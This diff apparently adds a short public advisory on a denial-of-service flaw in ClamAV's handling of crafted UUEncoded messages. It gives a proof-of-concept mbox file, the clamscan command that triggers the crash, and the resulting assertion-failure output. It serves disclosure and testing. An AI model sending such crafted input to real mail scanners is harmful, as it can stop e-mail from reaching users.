@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/9610/info
+
+A problem in the handling of specially crafted UUEncoded messages has been identified in ClamAV. Because of this, an attacker may prevent the delivery of e-mail to users.
+
+Save the following file to ~/clamtest.mbox:
+
+From -
+
+begin 644 byebye
+byebye
+end
+
+Then do:
+
+# clamscan --mbox -v ~/clamtest.mbox
+assertion "(len >= 0) && (len <= 63)" failed: file "message.c", line 887
+Abort (core dumped)
